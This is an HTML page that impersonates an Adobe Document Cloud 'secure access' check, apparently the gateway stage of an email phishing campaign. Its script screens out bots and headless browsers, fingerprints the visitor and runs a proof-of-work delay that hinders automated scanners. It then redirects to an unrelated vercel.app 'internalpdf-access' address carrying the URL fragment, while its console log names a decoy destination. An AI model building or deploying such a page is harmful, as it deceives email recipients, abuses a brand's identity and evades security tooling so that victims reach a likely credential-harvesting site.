<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Cloud - Verification</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #FAFBFC;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #2C2C2C;
            padding: 20px;
        }

        .container {
            background: #FFFFFF;
            border-radius: 16px;
            padding: 48px 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
            text-align: center;
            border: 1px solid #E8E8E8;
        }

        .logo-container {
            margin-bottom: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .logo-mark {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, #FA0F00 0%, #D10000 100%);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 800;
            font-size: 28px;
            box-shadow: 0 4px 12px rgba(250, 15, 0, 0.25);
        }

        .logo-text {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 2px;
        }

        .logo-title {
            font-size: 18px;
            font-weight: 700;
            color: #2C2C2C;
            letter-spacing: -0.3px;
        }

        .logo-subtitle {
            font-size: 12px;
            color: #999;
            font-weight: 500;
        }

        .security-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #F0F7FF 0%, #E6F2FF 100%);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 40px;
            border: 2px solid #D4E8FF;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            color: #2C2C2C;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .subtitle {
            font-size: 15px;
            color: #666666;
            margin-bottom: 32px;
            line-height: 1.6;
        }

        .progress-container {
            margin-bottom: 24px;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: #F0F0F0;
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 12px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #FA0F00, #FF4136);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 10px;
        }

        .progress-text {
            font-size: 14px;
            font-weight: 600;
            color: #FA0F00;
        }

        .spinner-container {
            margin: 32px 0;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #F0F0F0;
            border-top: 4px solid #FA0F00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status {
            font-size: 14px;
            color: #999999;
            margin-top: 16px;
            padding: 12px 20px;
            background: #F8F9FA;
            border-radius: 8px;
            font-weight: 500;
        }

        .status-icon {
            display: inline-block;
            margin-right: 6px;
        }

        .error {
            background: #FEF2F2;
            color: #DC2626;
            padding: 16px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 14px;
            font-weight: 500;
            border: 1px solid #FEE2E2;
            animation: slideIn 0.3s ease;
        }

        .success {
            background: #F0FDF4;
            color: #16A34A;
            padding: 16px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 14px;
            font-weight: 500;
            border: 1px solid #BBF7D0;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .security-features {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #F0F0F0;
        }

        .feature-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            text-align: left;
        }

        .feature-item {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 13px;
            color: #666666;
        }

        .feature-icon {
            width: 20px;
            height: 20px;
            background: #F0F7FF;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            flex-shrink: 0;
        }

        .checkmark {
            color: #16A34A;
        }

        .footer {
            margin-top: 32px;
            padding-top: 20px;
            border-top: 1px solid #F0F0F0;
            font-size: 12px;
            color: #999999;
        }

        @media (max-width: 480px) {
            .container {
                padding: 32px 24px;
            }

            h1 {
                font-size: 20px;
            }

            .subtitle {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Adobe Logo -->
        <div class="logo-container">
            <div class="logo-mark">A</div>
            <div class="logo-text">
                <div class="logo-title">Projects Document Cloud</div>
                <div class="logo-subtitle">Secure Access Portal</div>
            </div>
        </div>

        <!-- Security Icon -->
        <div class="security-icon">🔒</div>

        <!-- Heading -->
        <h1>Verifying Secure Connection</h1>
        <p class="subtitle">Please wait while we ensure your session is secure...</p>

        <!-- Progress Bar -->
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text" id="progressText">0%</div>
        </div>

        <!-- Spinner -->
        <div class="spinner-container">
            <div class="spinner" id="spinner"></div>
        </div>

        <!-- Status Message -->
        <div class="status" id="status">
            <span class="status-icon">⏳</span>
            <span>Initializing security verification...</span>
        </div>

        <!-- Security Features (shown during loading) -->
        <div class="security-features" id="securityFeatures">
            <div class="feature-list">
                <div class="feature-item">
                    <div class="feature-icon checkmark">✓</div>
                    <span>256-bit encryption</span>
                </div>
                <div class="feature-item">
                    <div class="feature-icon checkmark">✓</div>
                    <span>Bot detection active</span>
                </div>
                <div class="feature-item">
                    <div class="feature-icon checkmark">✓</div>
                    <span>Device authentication</span>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer">
            © 2026 Abode Inc. All rights reserved.
        </div>
    </div>

    <script>
        // ========== PROOF OF WORK CONFIGURATION ==========
        const POW_CONFIG = {
            difficulty: 4,           // Number of leading zeros required in hash
            maxIterations: 5000000,  // Maximum attempts before giving up
            updateInterval: 50000    // Update progress every N iterations
        };

        // ========== SHA-256 HASH FUNCTION ==========
        async function sha256(message) {
            const msgBuffer = new TextEncoder().encode(message);
            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            return hashHex;
        }

        // ========== PROOF OF WORK VALIDATION ==========
        async function performProofOfWork(challenge, difficulty) {
            const startTime = Date.now();
            let nonce = 0;
            let hash = '';
            const target = '0'.repeat(difficulty);

            updateStatus('⚙️', 'Computing cryptographic proof...');

            while (nonce < POW_CONFIG.maxIterations) {
                // Calculate hash
                const data = challenge + nonce;
                hash = await sha256(data);

                // Check if hash meets difficulty requirement
                if (hash.startsWith(target)) {
                    const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
                    console.log(`✅ Proof of Work completed!`);
                    console.log(`Nonce: ${nonce}`);
                    console.log(`Hash: ${hash}`);
                    console.log(`Time: ${elapsed}s`);
                    return { nonce, hash, iterations: nonce, time: elapsed };
                }

                // Update progress
                if (nonce % POW_CONFIG.updateInterval === 0) {
                    const progress = Math.min((nonce / POW_CONFIG.maxIterations) * 100, 99);
                    updateProgress(progress);
                    updateStatus('⚙️', `Verifying device... (${nonce.toLocaleString()} operations)`);
                    
                    // Allow UI to update
                    await new Promise(resolve => setTimeout(resolve, 0));
                }

                nonce++;
            }

            throw new Error('Security verification failed: Maximum attempts reached');
        }

        // ========== BROWSER FINGERPRINTING ==========
        function getBrowserFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Adobe fingerprint', 2, 2);
            
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                canvas: canvas.toDataURL(),
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack
            };
        }

        // ========== BOT DETECTION ==========
        function detectBot() {
            const botIndicators = [];

            // Check for headless browser
            if (navigator.webdriver) {
                botIndicators.push('WebDriver detected');
            }

            // Check for PhantomJS
            if (window.callPhantom || window._phantom) {
                botIndicators.push('PhantomJS detected');
            }

            // Check for automation tools
            if (window.navigator.plugins.length === 0) {
                botIndicators.push('No browser plugins');
            }

            // Check for suspicious user agent
            const ua = navigator.userAgent.toLowerCase();
            const botPatterns = ['bot', 'crawler', 'spider', 'scraper', 'headless'];
            if (botPatterns.some(pattern => ua.includes(pattern))) {
                botIndicators.push('Bot pattern in user agent');
            }

            return botIndicators;
        }

        // ========== UI UPDATES ==========
        function updateProgress(percent) {
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            progressFill.style.width = percent + '%';
            progressText.textContent = Math.round(percent) + '%';
        }

        function updateStatus(icon, message) {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = `<span class="status-icon">${icon}</span><span>${message}</span>`;
        }

        function showError(message) {
            const container = document.querySelector('.container');
            const errorDiv = document.createElement('div');
            errorDiv.className = 'error';
            errorDiv.innerHTML = '<strong>⚠️ Error:</strong> ' + message;
            
            // Remove spinner and security features
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('securityFeatures').style.display = 'none';
            
            container.insertBefore(errorDiv, document.getElementById('footer'));
        }

        function showSuccess(message) {
            const container = document.querySelector('.container');
            const successDiv = document.createElement('div');
            successDiv.className = 'success';
            successDiv.innerHTML = '<strong>✅ Success:</strong> ' + message;
            
            // Remove spinner
            document.getElementById('spinner').style.display = 'none';
            
            container.insertBefore(successDiv, document.getElementById('footer'));
        }

        // ========== MAIN VERIFICATION FLOW ==========
        async function verifyAndRedirect() {
            try {
                // Step 1: Bot detection
                updateStatus('🔍', 'Checking for automated access...');
                await new Promise(resolve => setTimeout(resolve, 800));

                const botIndicators = detectBot();
                if (botIndicators.length > 0) {
                    console.warn('Potential bot detected:', botIndicators);
                    // Continue anyway for this demo, but you could block here
                }

                // Step 2: Browser fingerprinting
                updateStatus('🔑', 'Generating device signature...');
                await new Promise(resolve => setTimeout(resolve, 600));
                
                const fingerprint = getBrowserFingerprint();
                const challenge = JSON.stringify(fingerprint) + Date.now();

                // Step 3: Proof of Work
                updateStatus('⚙️', 'Performing cryptographic verification...');
                const powResult = await performProofOfWork(challenge, POW_CONFIG.difficulty);

                updateProgress(100);
                updateStatus('✓', `Security verification complete! (${powResult.time}s)`);

                // Step 4: Get hash from URL
                const urlHash = window.location.hash.substring(1); // Remove the # symbol
                
                if (!urlHash) {
                    showError('No document identifier found in URL. Please use the link provided in your email.');
                    return;
                }

                // Step 5: Show success and redirect
                showSuccess(`Authentication successful. Redirecting to secure document portal...`);
                
                console.log('✅ Verification successful!');
                console.log('Document ID:', urlHash);
                console.log('Redirecting to: https://bbc.com/#' + urlHash);

                // Change icon to checkmark
                document.querySelector('.security-icon').innerHTML = '✅';
                document.querySelector('.security-icon').style.background = 'linear-gradient(135deg, #F0FDF4 0%, #DCFCE7 100%)';
                document.querySelector('.security-icon').style.borderColor = '#BBF7D0';

                // Redirect after 2.5 seconds
                setTimeout(() => {
                    window.location.href = 'https://internalpdf-access.vercel.app/adb2b#' + urlHash;
                }, 1000);

            } catch (error) {
                console.error('❌ Verification failed:', error);
                showError(error.message);
                
                // Change icon to error
                document.querySelector('.security-icon').innerHTML = '❌';
                document.querySelector('.security-icon').style.background = 'linear-gradient(135deg, #FEF2F2 0%, #FEE2E2 100%)';
                document.querySelector('.security-icon').style.borderColor = '#FECACA';
            }
        }

        // ========== START VERIFICATION ON PAGE LOAD ==========
        window.addEventListener('DOMContentLoaded', () => {
            console.log('🔒 Adobe Document Cloud - Starting security verification...');
            verifyAndRedirect();
        });
    </script>
</body>
</html>
